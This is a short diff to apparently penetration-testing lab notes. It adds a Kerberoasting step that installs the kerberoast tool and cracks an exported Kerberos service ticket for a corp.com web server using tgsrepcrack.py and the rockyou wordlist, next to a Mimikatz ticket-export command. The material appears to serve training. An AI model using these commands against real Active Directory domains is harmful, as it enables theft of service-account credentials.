@@ -323,6 +323,13 @@ To download the service ticket with Mimikatz, we use the kerberos::list command,
 ````
 kerberos::list /export
 `````
+##### kerberoast Exploitation
+````
+sudo apt update && sudo apt install kerberoast
+````
+````
+python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+````
 ##### Powershell
 This lists current cached tickets
 ````
